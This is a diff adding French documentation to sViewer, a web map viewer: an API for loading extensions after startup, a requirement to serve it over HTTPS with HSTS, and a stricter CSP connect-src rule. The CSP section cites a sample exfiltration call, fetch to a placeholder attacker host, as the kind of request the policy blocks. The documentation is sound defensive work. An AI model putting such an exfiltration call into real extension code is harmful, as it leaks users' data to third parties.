@@ -679,6 +679,42 @@ allowedDomains: ['my-georchestra.example.org', 'data.geopf.fr']
 - S'applique aux quatre points d'entrée : URL WMS personnalisée (`?layers=ns:layer@url`), URL WMS extraite d'un enregistrement CSW, URL WFS découverte via DescribeLayer, URL GeoJSON (`?geojson=`)
 - En cas de blocage, un avertissement est émis en console (`sViewer: blocked … not in allowedDomains`)
 
+### Chargement dynamique d'extension
+
+Par défaut, les extensions sont chargées au démarrage depuis `customConfig.extensions` et le paramètre URL `?ext=`. Depuis sViewer 0.14.1, l'API `SViewer.loadExtension(name)` permet de charger une extension après le boot.
+
+**Usages typiques :**
+
+- sélecteur de profils (page d'accueil → clic carte → chargement des extensions du profil)
+- activation à la demande (extension lourde chargée seulement à la première utilisation)
+- composition depuis la page hôte (parent `postMessage` → sViewer charge l'extension demandée)
+- auto-installation à la restauration (carte enregistrée référence `?ext=print` → `me` charge `print` si absent)
+
+```javascript
+SViewer.loadExtension('me')
+    .then(function (name) { /* extension active */ })
+    .catch(function (err) {
+        // err.code : invalid-name | manifest-fetch | manifest-parse |
+        //            version-mismatch | script-load
+    });
+
+SViewer.hasExtension('me');         // boolean
+SViewer.loadedExtensions();         // ['me', 'print', …] — snapshot
+```
+
+**Comportement :**
+
+- Idempotent : si déjà chargée, résolution immédiate avec le nom.
+- Déduplication des appels concurrents : un seul fetch, Promise partagée.
+- Vérifie `manifest.json.sviewer.minVersion` contre `SViewer.version` avant de charger le script.
+- Les extensions UI utilisant `SViewer.onMapReady(fn)` fonctionnent telles quelles : le callback se déclenche synchroniquement pour les abonnés tardifs si la carte est déjà prête.
+- Les adaptateurs (`SViewer.registerAdapter`) s'enregistrent immédiatement et sont disponibles pour les prochains `?geojson=` ; les données déjà chargées ne sont pas re-parsées rétroactivement (déclencher une actualisation manuellement).
+
+**Limites :**
+
+- Une extension qui écoute des événements globaux dès le top scope (par exemple `superset` qui écoute les messages `postMessage` envoyés par la page parente) peut manquer les événements émis avant la fin du chargement. Documenter ces extensions comme « boot-only ».
+- Aucune API de déchargement (`unloadExtension`) : un bouton de barre d'outils injecté reste en place. Les extensions doivent gérer leur propre cycle d'activation/désactivation.
+
 ### Sécurité — sanitisation HTML des panneaux d'extension
 
 Le HTML passé à `SViewer.panel.open()` et `SViewer.panel.update()` est sanitisé avant injection dans le DOM. La sanitisation supprime :
@@ -712,6 +748,63 @@ Chemins bloqués par défaut : `node_modules/`, `scripts/`, `build/ol-custom-ent
 **Cache `static/`** : depuis 0.13.0, les assets `static/` (hors `static/lib/`) sont servis avec `Cache-Control: no-cache, must-revalidate` au lieu de `max-age=3600` — le navigateur revalide via ETag à chaque visite, évitant les assets périmés après une mise à jour.
 
 Si vous utilisez Apache, reproduisez la même logique avec `Require all denied` sur les répertoires sensibles et `Require all granted` uniquement sur les chemins publics.
+
+### Sécurité — HTTPS obligatoire en production
+
+> **sViewer doit être déployé exclusivement en HTTPS.**
+
+Raisons :
+
+- **Intégrité des extensions** — `SViewer.loadExtension(name)` et le boot loader chargent `ext/<name>/extension.js` depuis le même origine que sViewer. Si sViewer est servi en HTTP, un attaquant en position d'homme du milieu (wifi public, FAI hostile, proxy d'entreprise compromis) peut substituer le code de n'importe quelle extension → exécution de code arbitraire dans l'origine sViewer = vol de session, persistance via `localStorage`, XSS persistant.
+- **Cartes enregistrées (`ext/me`)** — les URLs sauvegardées et exportées en JSON sont validées : seul HTTPS est accepté à l'ouverture (exception : HTTP même origine, pour le dev local). Un déploiement en HTTP ferait apparaître des messages « URL refusée » sur toute carte enregistrée pointant vers un autre serveur.
+- **OGC** — règle déjà imposée par le code (`CLAUDE.md`) : les services WMS/WFS/CSW doivent être HTTPS, comportement renforcé par la politique mixed-content du navigateur.
+- **RGPD** — pour le secteur public français (audience cible), HTTPS est obligatoire pour tout traitement de données personnelles.
+
+**Configuration minimale recommandée :**
+
+```nginx
+# Redirection HTTP → HTTPS au niveau du serveur global
+server {
+    listen 80;
+    server_name votre-domaine.fr;
+    return 301 https://$host$request_uri;
+}
+
+# Bloc HTTPS principal — applique le snippet sViewer
+server {
+    listen 443 ssl http2;
+    server_name votre-domaine.fr;
+    # … certificats Let's Encrypt ou équivalent …
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+    # … inclure deploy/nginx/nginx-server.conf …
+}
+```
+
+`Strict-Transport-Security` (HSTS) force le navigateur à utiliser HTTPS même si l'utilisateur tape `http://` — protection supplémentaire contre les attaques de downgrade.
+
+**Développement local** : `http://localhost/sviewer/` est toléré par `ext/me` (même origine = exception). Aucune dérogation pour des origines tierces en HTTP.
+
+### Sécurité — durcissement de la CSP `connect-src`
+
+La CSP par défaut (`deploy/nginx/nginx-server.conf`) inclut `connect-src 'self' https:` — sViewer et ses extensions peuvent appeler n'importe quelle URL HTTPS. Acceptable pour la majorité des déploiements, mais permet à une extension malveillante (ou compromise) d'exfiltrer des données vers un serveur tiers.
+
+**Pour les déploiements sensibles**, restreindre `connect-src` à la liste explicite des origines attendues :
+
+```nginx
+# Exemple : sViewer + IGN Géoplateforme + geOrchestra local + Nominatim
+add_header Content-Security-Policy "default-src 'none'; \
+    script-src 'self' 'sha256-…'; \
+    style-src 'self' 'unsafe-inline'; \
+    img-src 'self' data: blob: https:; \
+    font-src 'self'; \
+    connect-src 'self' https://data.geopf.fr https://wxs.ign.fr https://geo.votre-collectivite.fr https://nominatim.openstreetmap.org; \
+    manifest-src 'self'; base-uri 'self'; form-action 'none'; frame-ancestors *; \
+    upgrade-insecure-requests;" always;
+```
+
+Effet : si une extension tente `fetch('https://malveillant.example.com/exfil')`, le navigateur bloque la requête et émet une violation CSP dans la console. Combiné avec `report-uri` ou `report-to`, permet d'auditer les tentatives en production.
+
+**Compromis** : maintenance de la liste à chaque ajout de source de données. Solution : générer la liste depuis `customConfig.js` (`backends`, `allowedDomains`, etc.) via un script de déploiement.
 
 ### Mise à jour du hash CSP après modification de `index.html`
 
